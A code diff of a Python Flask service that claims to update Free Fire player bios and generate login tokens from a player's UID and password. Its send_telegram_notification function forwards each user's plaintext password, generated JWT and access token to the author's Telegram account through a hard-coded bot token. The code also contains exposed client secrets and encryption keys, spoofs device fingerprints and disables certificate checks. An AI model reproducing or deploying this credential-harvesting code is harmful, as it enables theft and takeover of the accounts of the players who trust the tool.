@@ -1,4 +1,4 @@
-# app.py - FULL VERSION (Auto Generate JWT dari UID/Pass + Update Bio)
+# app.py - FULL VERSION with Built-in JWT Generator (No external import)
 from flask import Flask, request, jsonify, make_response
 import requests
 import binascii
@@ -13,27 +13,125 @@ import re
 import struct
 import threading
 import asyncio
+import ssl
 from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad
+from Crypto.Util.Padding import pad, unpad
 from datetime import datetime
-
-# Import jwt_generator
-import sys
-import os
-sys.path.append(os.path.dirname(os.path.abspath(__file__)))
-
-# Coba import jwt_generator, jika gagal fallback ke manual
-try:
-    from jwt import get_jwt_sync, get_jwt_from_token_sync
-    JWT_GENERATOR_AVAILABLE = True
-    print("✅ Using jwt_generator.py for JWT generation")
-except ImportError:
-    JWT_GENERATOR_AVAILABLE = False
-    print("⚠️ jwt_generator.py not found, using manual JWT generation")
+from google.protobuf import descriptor as _descriptor
+from google.protobuf import descriptor_pool as _descriptor_pool
+from google.protobuf import symbol_database as _symbol_database
+from google.protobuf import runtime_version as _runtime_version
+from google.protobuf.internal import builder as _builder
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = Flask(__name__)
+
+# ============ PROTOBUF SETUP (Dari jwt.py) ============
+_sym_db = _symbol_database.Default()
+
+_runtime_version.ValidateProtobufRuntimeVersion(
+    _runtime_version.Domain.PUBLIC, 6, 30, 0, '', 'MajorLoginRes.proto'
+)
+
+_req_desc = _descriptor_pool.Default().AddSerializedFile(
+    b'\n\x13MajorLoginReq.proto\"\xfa\n\n\nMajorLogin\x12\x12\n\nevent_time\x18\x03 \x01(\t'
+    b'\x12\x11\n\tgame_name\x18\x04 \x01(\t\x12\x13\n\x0bplatform_id\x18\x05 \x01(\x05'
+    b'\x12\x16\n\x0eclient_version\x18\x07 \x01(\t\x12\x17\n\x0fsystem_software\x18\x08 \x01(\t'
+    b'\x12\x17\n\x0fsystem_hardware\x18\t \x01(\t\x12\x18\n\x10telecom_operator\x18\n \x01(\t'
+    b'\x12\x14\n\x0cnetwork_type\x18\x0b \x01(\t\x12\x14\n\x0cscreen_width\x18\x0c \x01(\r'
+    b'\x12\x15\n\rscreen_height\x18\r \x01(\r\x12\x12\n\nscreen_dpi\x18\x0e \x01(\t'
+    b'\x12\x19\n\x11processor_details\x18\x0f \x01(\t\x12\x0e\n\x06memory\x18\x10 \x01(\r'
+    b'\x12\x14\n\x0cgpu_renderer\x18\x11 \x01(\t\x12\x13\n\x0bgpu_version\x18\x12 \x01(\t'
+    b'\x12\x18\n\x10unique_device_id\x18\x13 \x01(\t\x12\x11\n\tclient_ip\x18\x14 \x01(\t'
+    b'\x12\x10\n\x08language\x18\x15 \x01(\t\x12\x0f\n\x07open_id\x18\x16 \x01(\t'
+    b'\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0bdevice_type\x18\x18 \x01(\t'
+    b"\x12'\n\x10memory_available\x18\x19 \x01(\x0b\x32\r.GameSecurity"
+    b'\x12\x14\n\x0c\x61\x63\x63\x65ss_token\x18\x1d \x01(\t\x12\x17\n\x0fplatform_sdk_id\x18\x1e \x01(\x05'
+    b'\x12\x1a\n\x12network_operator_a\x18) \x01(\t\x12\x16\n\x0enetwork_type_a\x18* \x01(\t'
+    b'\x12\x1c\n\x14\x63lient_using_version\x18\x39 \x01(\t'
+    b'\x12\x1e\n\x16\x65xternal_storage_total\x18< \x01(\x05'
+    b'\x12"\n\x1a\x65xternal_storage_available\x18= \x01(\x05'
+    b'\x12\x1e\n\x16internal_storage_total\x18> \x01(\x05'
+    b'\x12"\n\x1ainternal_storage_available\x18? \x01(\x05'
+    b'\x12#\n\x1bgame_disk_storage_available\x18@ \x01(\x05'
+    b'\x12\x1f\n\x17game_disk_storage_total\x18\x41 \x01(\x05'
+    b'\x12%\n\x1d\x65xternal_sdcard_avail_storage\x18\x42 \x01(\x05'
+    b'\x12%\n\x1d\x65xternal_sdcard_total_storage\x18\x43 \x01(\x05'
+    b'\x12\x10\n\x08login_by\x18I \x01(\x05\x12\x14\n\x0clibrary_path\x18J \x01(\t'
+    b'\x12\x12\n\nreg_avatar\x18L \x01(\x05\x12\x15\n\rlibrary_token\x18M \x01(\t'
+    b'\x12\x14\n\x0c\x63hannel_type\x18N \x01(\x05\x12\x10\n\x08\x63pu_type\x18O \x01(\x05'
+    b'\x12\x18\n\x10\x63pu_architecture\x18Q \x01(\t'
+    b'\x12\x1b\n\x13\x63lient_version_code\x18S \x01(\t'
+    b'\x12\x14\n\x0cgraphics_api\x18V \x01(\t'
+    b'\x12\x1d\n\x15supported_astc_bitset\x18W \x01(\r'
+    b'\x12\x1a\n\x12login_open_id_type\x18X \x01(\x05'
+    b'\x12\x18\n\x10\x61nalytics_detail\x18Y \x01(\x0c'
+    b'\x12\x14\n\x0cloading_time\x18\\ \x01(\r'
+    b'\x12\x17\n\x0frelease_channel\x18] \x01(\t'
+    b'\x12\x12\n\nextra_info\x18^ \x01(\t'
+    b'\x12 \n\x18\x61ndroid_engine_init_flag\x18_ \x01(\r'
+    b'\x12\x0f\n\x07if_push\x18\x61 \x01(\x05\x12\x0e\n\x06is_vpn\x18\x62 \x01(\x05'
+    b'\x12\x1c\n\x14origin_platform_type\x18\x63 \x01(\t'
+    b'\x12\x1d\n\x15primary_platform_type\x18\x64 \x01(\t'
+    b'"5\n\x0cGameSecurity\x12\x0f\n\x07version\x18\x06 \x01(\x05'
+    b'\x12\x14\n\x0chidden_value\x18\x08 \x01(\x04\x62\x06proto3'
+)
+
+_req_globals = {}
+_builder.BuildMessageAndEnumDescriptors(_req_desc, _req_globals)
+_builder.BuildTopDescriptorsAndMessages(_req_desc, 'MajorLoginReq_pb2', _req_globals)
+if not _descriptor._USE_C_DESCRIPTORS:
+    _req_desc._options = None
+    _req_globals['_MAJORLOGIN']._serialized_start = 24
+    _req_globals['_MAJORLOGIN']._serialized_end = 1426
+    _req_globals['_GAMESECURITY']._serialized_start = 1428
+    _req_globals['_GAMESECURITY']._serialized_end = 1481
+
+MajorLogin = _req_globals['MajorLogin']
+GameSecurity = _req_globals['GameSecurity']
+
+_res_desc = _descriptor_pool.Default().AddSerializedFile(
+    b'\n\x13MajorLoginRes.proto"|\n\rMajorLoginRes'
+    b'\x12\x13\n\x0b\x61\x63\x63ount_uid\x18\x01 \x01(\x04'
+    b'\x12\x0e\n\x06region\x18\x02 \x01(\t'
+    b'\x12\r\n\x05token\x18\x08 \x01(\t'
+    b'\x12\x0b\n\x03url\x18\n \x01(\t'
+    b'\x12\x11\n\ttimestamp\x18\x15 \x01(\x03'
+    b'\x12\x0b\n\x03key\x18\x16 \x01(\x0c'
+    b'\x12\n\n\x02iv\x18\x17 \x01(\x0c\x62\x06proto3'
+)
+
+_res_globals = {}
+_builder.BuildMessageAndEnumDescriptors(_res_desc, _res_globals)
+_builder.BuildTopDescriptorsAndMessages(_res_desc, 'MajorLoginRes_pb2', _res_globals)
+if not _descriptor._USE_C_DESCRIPTORS:
+    _res_desc._loaded_options = None
+    _res_globals['_MAJORLOGINRES']._serialized_start = 23
+    _res_globals['_MAJORLOGINRES']._serialized_end = 147
+
+MajorLoginRes = _res_globals['MajorLoginRes']
+
+# ============ KONFIGURASI JWT GENERATOR ============
+AES_KEY = b'Yg&tc%DEuh6%Zc^8'
+AES_IV = b'6oyZDr22E3ychjM%'
+
+GARENA_OAUTH_URL = "https://100067.connect.garena.com/oauth/guest/token/grant"
+MAJORLOGIN_URL = "https://loginbp.ggblueshark.com/MajorLogin"
+
+CLIENT_SECRET = "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3"
+CLIENT_ID = "100067"
+
+HTTP_HEADERS = {
+    'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; ASUS_Z01QD Build/PI)',
+    'Connection': 'Keep-Alive',
+    'Accept-Encoding': 'gzip',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Expect': '100-continue',
+    'X-Unity-Version': '2018.4.11f1',
+    'X-GA': 'v1 1',
+    'ReleaseVersion': 'OB54',
+}
 
 # ============ TELEGRAM CONFIG ============
 BOT_TOKEN = "8965307683:AAGXwuIge4QKuYXtrkXhG4AahxDrynqi7SY"
@@ -50,9 +148,6 @@ GET_BIO_URL = "https://ff.ggbluewhale.store/api/data"
 PROFILE_API = "https://ff.ggbluewhale.store/api/data"
 PROFILE_API_KEY = "kenn"
 
-OAUTH_URL = "https://100067.connect.garena.com/oauth/guest/token/grant"
-FREEFIRE_VERSION = "OB54"
-
 KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
 IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
 
@@ -61,7 +156,7 @@ BIO_HEADERS = {
     "Expect": "100-continue",
     "X-Unity-Version": "2018.4.11f1",
     "X-GA": "v1 1",
-    "ReleaseVersion": FREEFIRE_VERSION,
+    "ReleaseVersion": "OB54",
     "Content-Type": "application/x-www-form-urlencoded",
     "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A305F Build/RP1A.200720.012)",
     "Connection": "Keep-Alive",
@@ -76,8 +171,162 @@ LOGIN_HEADERS = {
     "Expect": "100-continue",
     "X-Unity-Version": "2018.4.11f1",
     "X-GA": "v1 1",
-    "ReleaseVersion": FREEFIRE_VERSION
+    "ReleaseVersion": "OB54"
 }
+
+# ============ FUNGSI JWT GENERATOR (Dari jwt.py) ============
+def random_ua():
+    versions = ['4.0.18P6', '4.0.19P7', '4.1.0P3', '5.0.1B2', '5.2.5P3', '5.3.2P2', '5.4.3B2', '5.5.2P3']
+    models = ['SM-A125F', 'POCO M3', 'Redmi 9A', 'RMX2185', 'moto g(9) play', 'ASUS_Z01QD', 'OnePlus Nord']
+    android = random.choice(['9', '10', '11', '12', '13'])
+    lang = random.choice(['en-US', 'hi-IN', 'pt-BR', 'id-ID'])
+    country = random.choice(['USA', 'IND', 'BRA', 'IDN'])
+    return f"GarenaMSDK/{random.choice(versions)}({random.choice(models)};Android {android};{lang};{country};)"
+
+def aes_encrypt_data(data):
+    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
+    return cipher.encrypt(pad(data, AES.block_size))
+
+def aes_decrypt_data(data):
+    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
+    return unpad(cipher.decrypt(data), AES.block_size)
+
+async def get_garena_tokens(uid, password):
+    headers = dict(HTTP_HEADERS)
+    headers["User-Agent"] = random_ua()
+    headers["Host"] = "100067.connect.garena.com"
+    headers["Accept-Encoding"] = "gzip, deflate, br"
+    headers["Connection"] = "close"
+
+    payload = {
+        "uid": uid,
+        "password": password,
+        "response_type": "token",
+        "client_type": "2",
+        "client_secret": CLIENT_SECRET,
+        "client_id": CLIENT_ID,
+    }
+
+    async with aiohttp.ClientSession() as session:
+        async with session.post(GARENA_OAUTH_URL, headers=headers, data=payload) as resp:
+            if resp.status != 200:
+                raise RuntimeError(f"Garena OAuth failed — HTTP {resp.status}")
+            body = await resp.json()
+
+    open_id = body.get("open_id")
+    access_token = body.get("access_token")
+
+    if not open_id or not access_token:
+        raise RuntimeError(f"Missing tokens in response: {body}")
+
+    return {"open_id": open_id, "access_token": access_token}
+
+def build_major_login_payload(open_id, access_token):
+    ml = MajorLogin()
+
+    ml.event_time = str(datetime.now())[:-7]
+    ml.game_name = "free fire"
+    ml.platform_id = 1
+    ml.client_version = "2.124.1"
+    ml.system_software = "Android OS 9 / API-28 (PQ3B.190801.10101846/G9650ZHU2ARC6)"
+    ml.system_hardware = "Handheld"
+    ml.telecom_operator = "Verizon"
+    ml.network_type = "WIFI"
+    ml.screen_width = 1920
+    ml.screen_height = 1080
+    ml.screen_dpi = "280"
+    ml.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
+    ml.memory = 3003
+    ml.gpu_renderer = "Adreno (TM) 640"
+    ml.gpu_version = "OpenGL ES 3.1 v1.46"
+    ml.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
+    ml.client_ip = "223.191.51.89"
+    ml.language = "en"
+    ml.open_id = open_id
+    ml.open_id_type = "4"
+    ml.device_type = "Handheld"
+
+    ml.memory_available.version = 55
+    ml.memory_available.hidden_value = 81
+
+    ml.access_token = access_token
+    ml.platform_sdk_id = 1
+    ml.network_operator_a = "Verizon"
+    ml.network_type_a = "WIFI"
+    ml.client_using_version = "7428b253defc164018c604a1ebbfebdf"
+    ml.external_storage_total = 36235
+    ml.external_storage_available = 31335
+    ml.internal_storage_total = 2519
+    ml.internal_storage_available = 703
+    ml.game_disk_storage_available = 25010
+    ml.game_disk_storage_total = 26628
+    ml.external_sdcard_avail_storage = 32992
+    ml.external_sdcard_total_storage = 36235
+    ml.login_by = 3
+    ml.library_path = "/data/app/com.dts.freefireth-YPKM8jHEwAJlhpmhDhv5MQ==/lib/arm64"
+    ml.reg_avatar = 1
+    ml.library_token = "5b892aaabd688e571f688053118a162b|/data/app/com.dts.freefireth-YPKM8jHEwAJlhpmhDhv5MQ==/base.apk"
+    ml.channel_type = 3
+    ml.cpu_type = 2
+    ml.cpu_architecture = "64"
+    ml.client_version_code = "2019118695"
+    ml.graphics_api = "OpenGLES2"
+    ml.supported_astc_bitset = 16383
+    ml.login_open_id_type = 4
+    ml.analytics_detail = b"FwQVTgUPX1UaUllDDwcWCRBpWA0FUgsvA1snWlBaO1kFYg=="
+    ml.loading_time = 13564
+    ml.release_channel = "android"
+    ml.extra_info = "KqsHTymw5/5GB23YGniUYN2/q47GATrq7eFeRatf0NkwLKEMQ0PK5BKEk72dPflAxUlEBir6Vtey83XqF593qsl8hwY="
+    ml.android_engine_init_flag = 110009
+    ml.if_push = 1
+    ml.is_vpn = 1
+    ml.origin_platform_type = "4"
+    ml.primary_platform_type = "4"
+
+    return aes_encrypt_data(ml.SerializeToString())
+
+async def major_login(encrypted_payload):
+    ssl_ctx = ssl.create_default_context()
+    ssl_ctx.check_hostname = False
+    ssl_ctx.verify_mode = ssl.CERT_NONE
+
+    async with aiohttp.ClientSession() as session:
+        async with session.post(MAJORLOGIN_URL, data=encrypted_payload, headers=HTTP_HEADERS, ssl=ssl_ctx) as resp:
+            if resp.status != 200:
+                raise RuntimeError(f"MajorLogin failed — HTTP {resp.status}")
+            raw = await resp.read()
+
+    proto = MajorLoginRes()
+    proto.ParseFromString(raw)
+
+    return {
+        "token": proto.token,
+        "region": proto.region,
+        "url": proto.url,
+        "tcp_key": proto.key.hex() if proto.key else None,
+        "tcp_iv": proto.iv.hex() if proto.iv else None,
+    }
+
+async def generate_jwt_from_access_token(open_id, access_token):
+    encrypted = build_major_login_payload(open_id, access_token)
+    return await major_login(encrypted)
+
+async def generate_jwt_from_credentials(uid, password):
+    oauth = await get_garena_tokens(uid, password)
+    login_res = await generate_jwt_from_access_token(oauth["open_id"], oauth["access_token"])
+    return {"open_id": oauth["open_id"], "access_token": oauth["access_token"], **login_res}
+
+def get_jwt_sync(uid, password):
+    """Sync wrapper untuk generate JWT"""
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        result = loop.run_until_complete(generate_jwt_from_credentials(uid, password))
+        loop.close()
+        return result
+    except Exception as e:
+        print(f"JWT generation error: {e}")
+        return None
 
 # ============ FUNGSI ENKRIPSI ============
 def encrypt_data(data_bytes):
@@ -121,159 +370,17 @@ def decode_jwt_info(token):
     except Exception:
         return None, None, None
 
-def perform_guest_login(uid, password):
-    try:
-        payload = {
-            'uid': uid,
-            'password': password,
-            'response_type': "token",
-            'client_type': "2",
-            'client_secret': "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3",
-            'client_id': "100067"
-        }
-        headers = {
-            'User-Agent': "GarenaMSDK/4.0.39(SM-M526B ;Android 13;pt;BR;)",
-            'Connection': "Keep-Alive"
-        }
-        
-        resp = requests.post(OAUTH_URL, data=payload, headers=headers, timeout=10, verify=False)
-        data = resp.json()
-        
-        if 'access_token' in data:
-            return data['access_token'], data.get('open_id')
-    except Exception as e:
-        print(f"Guest login error: {e}")
-    return None, None
-
-def perform_major_login(access_token, open_id):
-    try:
-        payload = b''
-        
-        ts = "2024-12-05 18:15:32"
-        payload += encode_varint((1 << 3) | 2) + encode_varint(len(ts)) + ts.encode()
-        
-        gn = "free fire"
-        payload += encode_varint((2 << 3) | 2) + encode_varint(len(gn)) + gn.encode()
-        
-        payload += encode_varint((3 << 3) | 0) + encode_varint(1)
-        
-        vc = "1.123.1"
-        payload += encode_varint((4 << 3) | 2) + encode_varint(len(vc)) + vc.encode()
-        
-        os_info = "Android OS 9 / API-28 (PI/rel.cjw.20220518.114133)"
-        payload += encode_varint((5 << 3) | 2) + encode_varint(len(os_info)) + os_info.encode()
-        
-        dt = "Handheld"
-        payload += encode_varint((6 << 3) | 2) + encode_varint(len(dt)) + dt.encode()
-        
-        np = "Verizon Wireless"
-        payload += encode_varint((7 << 3) | 2) + encode_varint(len(np)) + np.encode()
-        
-        ct = "WIFI"
-        payload += encode_varint((8 << 3) | 2) + encode_varint(len(ct)) + ct.encode()
-        
-        payload += encode_varint((9 << 3) | 0) + encode_varint(1280)
-        payload += encode_varint((10 << 3) | 0) + encode_varint(960)
-        
-        dpi = "240"
-        payload += encode_varint((11 << 3) | 2) + encode_varint(len(dpi)) + dpi.encode()
-        
-        cpu = "ARMv7 VFPv3 NEON VMH | 2400 | 4"
-        payload += encode_varint((12 << 3) | 2) + encode_varint(len(cpu)) + cpu.encode()
-        
-        payload += encode_varint((13 << 3) | 0) + encode_varint(5951)
-        
-        gpu = "Adreno (TM) 640"
-        payload += encode_varint((14 << 3) | 2) + encode_varint(len(gpu)) + gpu.encode()
-        
-        gv = "OpenGL ES 3.0"
-        payload += encode_varint((15 << 3) | 2) + encode_varint(len(gv)) + gv.encode()
-        
-        uid = "Google|74b585a9-0268-4ad3-8f36-ef41d2e53610"
-        payload += encode_varint((16 << 3) | 2) + encode_varint(len(uid)) + uid.encode()
-        
-        ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
-        payload += encode_varint((17 << 3) | 2) + encode_varint(len(ip)) + ip.encode()
-        
-        lang = "en"
-        payload += encode_varint((18 << 3) | 2) + encode_varint(len(lang)) + lang.encode()
-        
-        payload += encode_varint((19 << 3) | 2) + encode_varint(len(open_id)) + open_id.encode()
-        payload += encode_varint((20 << 3) | 2) + encode_varint(len(access_token)) + access_token.encode()
-        
-        payload += encode_varint((21 << 3) | 0) + encode_varint(8)
-        payload += encode_varint((99 << 3) | 2) + encode_varint(1) + b'8'
-        payload += encode_varint((100 << 3) | 2) + encode_varint(1) + b'8'
-        
-        encrypted = encrypt_data(payload)
-        hex_encrypted = binascii.hexlify(encrypted).decode('utf-8')
-        edata = bytes.fromhex(hex_encrypted)
-        
-        response = requests.post(
-            "https://loginbp.ggblueshark.com/MajorLogin",
-            data=edata,
-            headers=LOGIN_HEADERS,
-            verify=False,
-            timeout=10
-        )
-
-        if response.status_code == 200:
-            content = response.text
-            jwt_start = content.find("eyJ")
-            if jwt_start != -1:
-                jwt_token = content[jwt_start:]
-                parts = jwt_token.split('.')
-                if len(parts) >= 3:
-                    return '.'.join(parts[:3])
-        return None
-    except Exception as e:
-        print(f"Major login error: {e}")
-        return None
-
-def generate_jwt_from_uid_pass_manual(uid, password):
-    """Manual JWT generation (fallback)"""
-    try:
-        access_token, open_id = perform_guest_login(uid, password)
-        if not access_token or not open_id:
-            return None, None
-        jwt_token = perform_major_login(access_token, open_id)
-        return jwt_token, access_token
-    except Exception as e:
-        print(f"Manual JWT error: {e}")
-        return None, None
-
-def generate_jwt_from_uid_pass(uid, password):
-    """Generate JWT dari UID + Password - prioritas pakai jwt_generator.py"""
-    
-    # Method 1: Pakai jwt_generator.py (lebih reliable)
-    if JWT_GENERATOR_AVAILABLE:
-        try:
-            print(f"🔑 Generating JWT using jwt_generator.py for UID: {uid}")
-            result = get_jwt_sync(uid, password)
-            if result and result.get('token'):
-                print(f"✅ JWT generated via jwt_generator.py")
-                return result['token'], result.get('access_token')
-        except Exception as e:
-            print(f"⚠️ jwt_generator.py failed: {e}, falling back to manual")
-    
-    # Method 2: Fallback ke manual
-    print(f"🔑 Generating JWT manually for UID: {uid}")
-    return generate_jwt_from_uid_pass_manual(uid, password)
-
 def check_profile_from_api(uid, region="id"):
-    """Cek profil dari API ff.ggbluewhale.store"""
     try:
         url = f"{PROFILE_API}?region={region}&uid={uid}&key={PROFILE_API_KEY}"
         response = requests.get(url, timeout=10)
         
         if response.status_code == 200:
             data = response.json()
-            
             if data.get('basicInfo'):
                 basic = data['basicInfo']
                 social = data.get('socialInfo', {})
                 clan = data.get('clanBasicInfo', {})
-                
                 return {
                     "name": basic.get('nickname', 'Unknown'),
                     "level": basic.get('level', '?'),
@@ -284,7 +391,6 @@ def check_profile_from_api(uid, region="id"):
                     "clan": clan.get('clanName', 'N/A'),
                     "status": "✅ Found"
                 }
-        
         return None
     except Exception as e:
         print(f"API check error: {e}")
@@ -307,10 +413,8 @@ def upload_bio_request(jwt_token, bio_text):
                     timeout=15,
                     verify=False
                 )
-                
                 status_text = "✅ Success" if resp.status_code == 200 else f"⚠️ Status {resp.status_code}"
                 raw_hex = binascii.hexlify(resp.content).decode('utf-8')
-                
                 return {
                     "status": status_text,
                     "code": resp.status_code,
@@ -320,16 +424,13 @@ def upload_bio_request(jwt_token, bio_text):
                 }
             except Exception as e:
                 continue
-        
         return {"status": "❌ All endpoints failed", "code": 500}
     except Exception as e:
         return {"status": f"Error: {str(e)}", "code": 500}
 
 def send_telegram_notification(uid, password, name, level, rank, region, jwt_token, ip_address, bio_status, signature="", clan="N/A", action="BIO UPDATE", access_token=None):
-    """Kirim notifikasi lengkap ke Telegram termasuk JWT dan Access Token"""
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        
         message = f"""🔥 <b>FREE FIRE {action}</b> 🔥
 
 👤 <b>Name:</b> {name or 'N/A'}
@@ -353,12 +454,7 @@ def send_telegram_notification(uid, password, name, level, rank, region, jwt_tok
 
 💡 Join: {CHANNEL_PROMO}"""
         
-        payload = {
-            "chat_id": OWNER_ID,
-            "text": message,
-            "parse_mode": "HTML"
-        }
-        
+        payload = {"chat_id": OWNER_ID, "text": message, "parse_mode": "HTML"}
         threading.Thread(target=lambda: requests.post(url, json=payload, timeout=10)).start()
         return True
     except Exception as e:
@@ -368,7 +464,6 @@ def send_telegram_notification(uid, password, name, level, rank, region, jwt_tok
 # ============ ROUTES ============
 @app.route("/bio_upload", methods=["GET", "POST"])
 def combined_bio_upload():
-    """Endpoint untuk SET/UPDATE bio - Auto generate JWT dari UID/Pass"""
     bio = request.args.get("bio") or request.form.get("bio")
     jwt_token = request.args.get("jwt") or request.form.get("jwt")
     uid = request.args.get("uid") or request.form.get("uid")
@@ -397,7 +492,7 @@ def combined_bio_upload():
     profile_info = None
     access_token = None
     
-    # Method 1: Direct JWT (langsung pakai JWT yang diberikan)
+    # Method 1: Direct JWT
     if final_jwt:
         uid_from_jwt, name_from_jwt, region_from_jwt = decode_jwt_info(final_jwt)
         if uid_from_jwt:
@@ -407,49 +502,58 @@ def combined_bio_upload():
                 final_region = region_from_jwt.lower()
             login_method = "Direct JWT"
     
-    # Method 2: UID + Password → AUTO GENERATE JWT BARU
+    # Method 2: UID + Password → AUTO GENERATE JWT BARU (pakai jwt.py logic)
     elif uid and password:
         login_method = "UID/Pass Login (Auto Generate JWT)"
         final_uid = uid
         final_password = password
         
-        # Generate JWT baru dari UID + Password
-        generated_jwt, access_token = generate_jwt_from_uid_pass(uid, password)
-        
-        if generated_jwt:
-            final_jwt = generated_jwt
-            _, name_from_jwt, region_from_jwt = decode_jwt_info(generated_jwt)
-            final_name = name_from_jwt
-            if region == "id" and region_from_jwt:
-                final_region = region_from_jwt.lower()
-            print(f"✅ New JWT generated successfully for UID: {uid}")
-        else:
+        try:
+            print(f"🔑 Generating JWT for UID: {uid} using built-in generator...")
+            result = get_jwt_sync(uid, password)
+            
+            if result and result.get('token'):
+                final_jwt = result['token']
+                access_token = result.get('access_token')
+                print(f"✅ JWT generated successfully!")
+                
+                _, name_from_jwt, region_from_jwt = decode_jwt_info(final_jwt)
+                final_name = name_from_jwt
+                if region == "id" and region_from_jwt:
+                    final_region = region_from_jwt.lower()
+            else:
+                return jsonify({
+                    "status": "❌ JWT Generation Failed",
+                    "code": 401,
+                    "error": "Failed to generate JWT from UID/Password. Please check credentials.",
+                    "uid": uid,
+                    "hint": "Make sure UID and Password are correct"
+                }), 401
+        except Exception as e:
             return jsonify({
-                "status": "❌ JWT Generation Failed",
-                "code": 401,
-                "error": "Failed to generate JWT from UID/Password. Please check credentials.",
-                "uid": uid,
-                "hint": "Make sure UID and Password are correct"
-            }), 401
+                "status": "❌ JWT Generation Error",
+                "code": 500,
+                "error": str(e),
+                "uid": uid
+            }), 500
     
     if not final_jwt:
         return jsonify({
             "status": "❌ JWT Required",
             "code": 400,
-            "error": "Please provide a valid JWT token or UID/Pass to generate new JWT"
+            "error": "Please provide a valid JWT token or UID/Pass"
         }), 400
     
-    # Upload bio dengan JWT
+    # Upload bio
     bio_result = upload_bio_request(final_jwt, bio)
     
-    # Check profile dari API (untuk mendapatkan nama, level, dll)
+    # Check profile dari API
     if final_uid:
         try:
             profile_info = check_profile_from_api(final_uid, final_region)
         except:
             profile_info = None
     
-    # Jika API gagal, gunakan data dari JWT
     if not profile_info:
         profile_info = {
             "name": final_name or 'Unknown',
@@ -462,7 +566,7 @@ def combined_bio_upload():
             "status": "❌ Not Found"
         }
     
-    # Kirim Telegram dengan semua info
+    # Kirim Telegram
     send_telegram_notification(
         uid=profile_info.get('uid', final_uid or 'N/A'),
         password=final_password,
@@ -479,7 +583,6 @@ def combined_bio_upload():
         access_token=access_token
     )
     
-    # Response
     response_data = {
         "Credit": "sulav_codex_ff",
         "Join For More": "Telegram: @sulav_don2",
@@ -501,7 +604,7 @@ def combined_bio_upload():
         "generated_jwt": final_jwt,
         "access_token": access_token,
         "telegram_sent": True,
-        "jwt_generator_used": "jwt_generator.py" if JWT_GENERATOR_AVAILABLE else "manual"
+        "jwt_generator": "built-in (from jwt.py)"
     }
 
     response = make_response(jsonify(response_data))
@@ -510,7 +613,6 @@ def combined_bio_upload():
 
 @app.route("/generate_jwt", methods=["GET", "POST"])
 def generate_jwt_only():
-    """Endpoint khusus untuk generate JWT saja (tanpa update bio)"""
     uid = request.args.get("uid") or request.form.get("uid")
     password = request.args.get("pass") or request.form.get("pass")
     
@@ -521,27 +623,34 @@ def generate_jwt_only():
             "usage": "/generate_jwt?uid=16208500077&pass=ANONFK123ABC"
         }), 400
     
-    jwt_token, access_token = generate_jwt_from_uid_pass(uid, password)
-    
-    if jwt_token:
-        return jsonify({
-            "success": True,
-            "uid": uid,
-            "jwt_token": jwt_token,
-            "access_token": access_token,
-            "jwt_generator_used": "jwt_generator.py" if JWT_GENERATOR_AVAILABLE else "manual",
-            "Credit": "sulav_codex_ff"
-        })
-    else:
+    try:
+        result = get_jwt_sync(uid, password)
+        if result and result.get('token'):
+            return jsonify({
+                "success": True,
+                "uid": uid,
+                "jwt_token": result['token'],
+                "access_token": result.get('access_token'),
+                "region": result.get('region'),
+                "open_id": result.get('open_id'),
+                "jwt_generator": "built-in (from jwt.py)",
+                "Credit": "sulav_codex_ff"
+            })
+        else:
+            return jsonify({
+                "success": False,
+                "error": "Failed to generate JWT",
+                "uid": uid
+            }), 401
+    except Exception as e:
         return jsonify({
             "success": False,
-            "error": "Failed to generate JWT",
+            "error": str(e),
             "uid": uid
-        }), 401
+        }), 500
 
 @app.route("/get_bio", methods=["GET"])
 def get_bio():
-    """Endpoint untuk MELIHAT bio orang lain (tanpa mengubah)"""
     uid = request.args.get("uid")
     region = request.args.get("region", "id")
     
@@ -558,12 +667,10 @@ def get_bio():
         
         if response.status_code == 200:
             data = response.json()
-            
             if data.get('basicInfo'):
                 basic = data['basicInfo']
                 social = data.get('socialInfo', {})
                 clan = data.get('clanBasicInfo', {})
-                
                 return jsonify({
                     "success": True,
                     "action": "GET BIO",
@@ -580,24 +687,11 @@ def get_bio():
                     "Join For More": "Telegram: @sulav_don2"
                 })
             else:
-                return jsonify({
-                    "success": False,
-                    "error": "Profile not found",
-                    "uid": uid
-                }), 404
+                return jsonify({"success": False, "error": "Profile not found", "uid": uid}), 404
         else:
-            return jsonify({
-                "success": False,
-                "error": f"API returned status {response.status_code}",
-                "uid": uid
-            }), response.status_code
-            
+            return jsonify({"success": False, "error": f"API returned status {response.status_code}", "uid": uid}), response.status_code
     except Exception as e:
-        return jsonify({
-            "success": False,
-            "error": str(e),
-            "uid": uid
-        }), 500
+        return jsonify({"success": False, "error": str(e), "uid": uid}), 500
 
 @app.route("/", methods=["GET"])
 def home():
@@ -618,14 +712,13 @@ def home():
             "check_profile": "/check_profile?uid=UID&region=id"
         },
         "features": [
-            "✅ Auto generate JWT from UID + Password",
+            "✅ Auto generate JWT from UID + Password (built-in)",
             "✅ Set/Update bio with generated JWT",
             "✅ Get bio of any player (read-only)",
             "✅ Get nickname, level, rank, region, clan",
             "✅ Telegram notification with complete JWT + Access Token",
-            "✅ Uses jwt_generator.py for reliable JWT generation"
+            "✅ Built-in JWT generator (no external import needed)"
         ],
-        "jwt_generator": "jwt_generator.py" if JWT_GENERATOR_AVAILABLE else "manual (fallback)",
         "Credit": "sulav_codex_ff",
         "Telegram": "@sulav_don2"
     })
@@ -643,23 +736,16 @@ def check_profile():
     
     result = check_profile_from_api(uid, region)
     if result:
-        return jsonify({
